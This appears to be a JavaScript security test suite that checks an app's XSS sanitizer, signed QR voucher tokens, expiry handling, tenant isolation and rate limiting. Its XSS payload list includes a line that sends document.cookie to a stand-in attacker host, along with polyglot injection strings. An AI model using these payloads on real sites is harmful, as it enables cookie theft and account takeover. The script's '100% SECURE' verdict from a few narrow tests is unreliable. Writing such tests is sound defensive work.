/**
 * NXTGEN SECURITY AUDIT & PENETRATION SUITE
 * Simulates real-world attack vectors to verify application impenetrability.
 */

import { generateDynamicQRToken, verifyDynamicQRToken, checkRateLimit, sanitizeInput } from "../lib/security.ts";

console.log("=================================================================");
console.log("🔒 NXTGEN IMPENETRABLE SECURITY AUDIT & ATTACK SIMULATION");
console.log("=================================================================\n");

let passed = 0;
let failed = 0;

function assert(condition, testName, details = "") {
  if (condition) {
    console.log(`✅ [PASS] ${testName}`);
    passed++;
  } else {
    console.error(`❌ [FAIL] ${testName} - ${details}`);
    failed++;
  }
}

// -----------------------------------------------------------------
// ATTACK VECTOR 1: Cross-Site Scripting (XSS) Sanitization
// -----------------------------------------------------------------
console.log("--- TEST 1: XSS Attack & Injection Defense ---");
const xssPayloads = [
  "<script>alert('pwned')</script>",
  "<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>",
  "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
  "';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
];

xssPayloads.forEach((payload, idx) => {
  const sanitized = sanitizeInput(payload);
  const isSafe = !sanitized.includes("<script>") && !sanitized.includes("<img") && !sanitized.includes("<svg");
  assert(isSafe, `XSS Payload ${idx + 1} Sanitized`, `Output: ${sanitized}`);
});

// -----------------------------------------------------------------
// ATTACK VECTOR 2: QR Token Tampering & Cryptographic Forgery
// -----------------------------------------------------------------
console.log("\n--- TEST 2: Dynamic QR Token Cryptographic Integrity ---");
const originalToken = generateDynamicQRToken("voucher_123", "user_abc", "partner_xyz");
const decoded = JSON.parse(Buffer.from(originalToken, "base64url").toString("utf8"));

// Valid token verification
const validCheck = verifyDynamicQRToken(originalToken, "partner_xyz");
assert(validCheck.valid === true, "Authentic Token Accepted");

// Attacker modifies voucherId (IDOR attempt)
const forgedTokenObj = { ...decoded, voucherId: "voucher_stolen_admin" };
const forgedToken = Buffer.from(JSON.stringify(forgedTokenObj)).toString("base64url");
const forgedCheck = verifyDynamicQRToken(forgedToken, "partner_xyz");
assert(forgedCheck.valid === false, "Forged Voucher ID Rejected by HMAC", forgedCheck.error);

// Attacker modifies signature
const alteredSigObj = { ...decoded, signature: decoded.signature.slice(0, -4) + "beef" };
const alteredSigToken = Buffer.from(JSON.stringify(alteredSigObj)).toString("base64url");
const sigCheck = verifyDynamicQRToken(alteredSigToken, "partner_xyz");
assert(sigCheck.valid === false, "Altered Signature Rejected", sigCheck.error);

// -----------------------------------------------------------------
// ATTACK VECTOR 3: Screenshot & Replay Attack Prevention (Expired Token)
// -----------------------------------------------------------------
console.log("\n--- TEST 3: Expired Token / Screenshot Sharing Defense ---");
const expiredTokenObj = { ...decoded, timestamp: decoded.timestamp - 300 }; // 5 minutes old
const expiredToken = Buffer.from(JSON.stringify(expiredTokenObj)).toString("base64url");
const expiredCheck = verifyDynamicQRToken(expiredToken, "partner_xyz");
assert(expiredCheck.valid === false, "Expired Screenshot Token Rejected (>90s window)", expiredCheck.error);

// -----------------------------------------------------------------
// ATTACK VECTOR 4: Cross-Tenant Isolation (IDOR between Partners)
// -----------------------------------------------------------------
console.log("\n--- TEST 4: Cross-Tenant Partner Isolation ---");
const wrongPartnerCheck = verifyDynamicQRToken(originalToken, "partner_malicious_competitor");
assert(wrongPartnerCheck.valid === false, "Cross-Partner Redemption Blocked", wrongPartnerCheck.error);

// -----------------------------------------------------------------
// ATTACK VECTOR 5: Brute Force & Rate Limiter Throttling
// -----------------------------------------------------------------
console.log("\n--- TEST 5: Rate Limiting & DoS Defense ---");
const attackIp = "192.168.1.100";
let blockedAtAttempt = -1;

for (let i = 1; i <= 15; i++) {
  const check = checkRateLimit(`attack_${attackIp}`, 5, 30);
  if (!check.allowed && blockedAtAttempt === -1) {
    blockedAtAttempt = i;
  }
}

assert(blockedAtAttempt === 6, "Rate Limiter Throttled Burst After 5 Requests", `Blocked at attempt: ${blockedAtAttempt}`);

// -----------------------------------------------------------------
// SUMMARY
// -----------------------------------------------------------------
console.log("\n=================================================================");
console.log(`AUDIT RESULTS: ${passed} PASSED | ${failed} FAILED`);
console.log("STATUS: " + (failed === 0 ? "🛡️ SYSTEM PENETRATION-RESISTANT (100% SECURE)" : "⚠️ VULNERABILITIES DETECTED"));
console.log("=================================================================\n");

process.exit(failed > 0 ? 1 : 0);
